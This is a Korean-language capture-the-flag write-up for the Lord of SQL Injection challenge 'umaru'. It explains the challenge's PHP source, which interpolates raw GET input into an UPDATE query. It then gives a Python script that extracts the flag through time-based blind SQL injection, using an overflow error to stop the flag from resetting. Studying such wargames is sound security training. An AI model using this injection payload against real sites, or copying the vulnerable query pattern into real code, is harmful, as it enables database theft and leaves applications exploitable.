# Lord of SQL Injection No.25 - umaru

## 문제 출제 의도
GET 방식으로 받아와 완성한 SQL Query 문의 출력 없이 php코드를 분석하여 flag값이 바뀌지 않도록 유도하며 Error based SQL Injection을 한다.

## 소스 코드 분석
```php
<?php
  include "./config.php";
  login_chk();
  dbconnect();

  function reset_flag(){
    $new_flag = substr(md5(rand(10000000,99999999)."qwer".rand(10000000,99999999)."asdf".rand(10000000,99999999)),8,16);
    $chk = @mysql_fetch_array(mysql_query("select id from prob_umaru where id='{$_SESSION[los_id]}'"));
    if(!$chk[id]) mysql_query("insert into prob_umaru values('{$_SESSION[los_id]}','{$new_flag}')");
    else mysql_query("update prob_umaru set flag='{$new_flag}' where id='{$_SESSION[los_id]}'");
    echo "reset ok";
    highlight_file(__FILE__);
    exit();
  }

  if(!$_GET[flag]){ highlight_file(__FILE__); exit; }

  if(preg_match('/prob|_|\./i', $_GET[flag])) exit("No Hack ~_~");
  if(preg_match('/id|where|order|limit|,/i', $_GET[flag])) exit("HeHe");
  if(strlen($_GET[flag])>100) exit("HeHe");

  $realflag = @mysql_fetch_array(mysql_query("select flag from prob_umaru where id='{$_SESSION[los_id]}'"));

  @mysql_query("create temporary table prob_umaru_temp as select * from prob_umaru where id='{$_SESSION[los_id]}'");
  @mysql_query("update prob_umaru_temp set flag={$_GET[flag]}");

  $tempflag = @mysql_fetch_array(mysql_query("select flag from prob_umaru_temp"));
  if((!$realflag[flag]) || ($realflag[flag] != $tempflag[flag])) reset_flag();

  if($realflag[flag] === $_GET[flag]) solve("umaru");
?>
```
-----
```php
  function reset_flag(){
    $new_flag = substr(md5(rand(10000000,99999999)."qwer".rand(10000000,99999999)."asdf".rand(10000000,99999999)),8,16);
    $chk = @mysql_fetch_array(mysql_query("select id from prob_umaru where id='{$_SESSION[los_id]}'"));
    if(!$chk[id]) mysql_query("insert into prob_umaru values('{$_SESSION[los_id]}','{$new_flag}')");
    else mysql_query("update prob_umaru set flag='{$new_flag}' where id='{$_SESSION[los_id]}'");
    echo "reset ok";
    highlight_file(__FILE__);
    exit();
  }
```
- 사용자 정의 함수 reset_flag()를 선언한다.

- md5()는 주어진 문자열의 해시값을 구해주는 함수이다.

- .rand(10000000,99999999)는 10000000부터 99999999까지의 랜덤값을 구해주는 함수이다.

- substr()은 첫 인자의 문자열중 두번째 인자 인덱스부터 세번째 인자만큼의 문자열을 잘라내어 리턴해주는 함수이다.

- 위의 함수들을 통해 새로운 flag값을 구해주어 $new_flag 변수에 저장해준다.

- 현재 세션값에 해당하는 아이디 행이 데이터 베이스에 있는지를 확인하여 $chk 변수에 리턴하여 저장해주고 그것이 있는지 없는지에 따라서 새로운 flag를 생성할지와 업데이트 할지를 결정한다.

----- 
```php 
if(!$_GET[flag]){ highlight_file(__FILE__); exit; }

if(preg_match('/prob|_|\./i', $_GET[flag])) exit("No Hack ~_~");
if(preg_match('/id|where|order|limit|,/i', $_GET[flag])) exit("HeHe");
if(strlen($_GET[flag])>100) exit("HeHe");
```
- flag가 입력 되있지 않을 때 현재 파일의 위치를 highlight_file 함수에 인자로 보내며 탈출한다.

- `prob`,`_`,`.` 가 GET 방식으로 입력한 flag에 있다면 `No Hack ~_~`를 출력하며 문제 풀이에 실패한다.

- `id`,`where`,`order`,`limit`가 입력한 flag에 있다면 `HeHe`를 출력하며 문제 풀이에 실패한다.

- GET 방식으로 입력한 flag 값의 길이가 100을 넘는다면 문제 풀이에 실패한다.
-----
```php
$realflag = @mysql_fetch_array(mysql_query("select flag from prob_umaru where id='{$_SESSION[los_id]}'"));

@mysql_query("create temporary table prob_umaru_temp as select * from prob_umaru where id='{$_SESSION[los_id]}'");
@mysql_query("update prob_umaru_temp set flag={$_GET[flag]}");

$tempflag = @mysql_fetch_array(mysql_query("select flag from prob_umaru_temp"));
if((!$realflag[flag]) || ($realflag[flag] != $tempflag[flag])) reset_flag();

if($realflag[flag] === $_GET[flag]) solve("umaru");
```
- realflag 는 세션값에 해당하는 flag 값을 받아온다.

- prob_umaru 테이블에서 세션값에 맞는 레코드를 불러와 임시 테이블을 생성하여 저장한다.

- 입력한 flag값으로 임시테이블의 flag을 바꾼다.

- 임시 테이블에서 받아온 flag의 값이 실제 flag의 값과 같을 경우 문제풀이에 성공하고 같지 않을 경우에 real_flag를 초기화 해주는 reset_flag() 함수를 실행한다.

## 지수 연산 최대치
이 문제는 Error based SQL Injection으로 지수 연산 최대치를 이용해 Error을 발생시켜 Error based SQL injection을 한다.

## 문제 풀이 방법
PHP 오류를 발생시켜 reset_flag함수를 실행시키지 않는다면 문제 풀이에 가능하다.
```python
import urllib.request
from urllib.parse import quote
import time

url = "http://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?flag="
key = ""    
len=16

for i in range(1, len+1):
    for j in range(48, 127):
        data = "(case(substr(flag from {} for 1)) when '{}' then ((sleep(4)+2)*9e307) else 9e307*2 end)".format(str(i), chr(j))
        print(data)
        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36")
        re.add_header("Cookie", "PHPSESSID=gnpaf1s3c18g34i6ge3510du81")
        st = time.time()
        res = urllib.request.urlopen(re)
        et = time.time()

        if et-st > 4:
            key += chr(j).lower()
            print (key)
            break
print (key)
```
다음 코드를 구동하면 flag값이 나오며 해당 flag값을 입력하면 문제풀이에 성공한다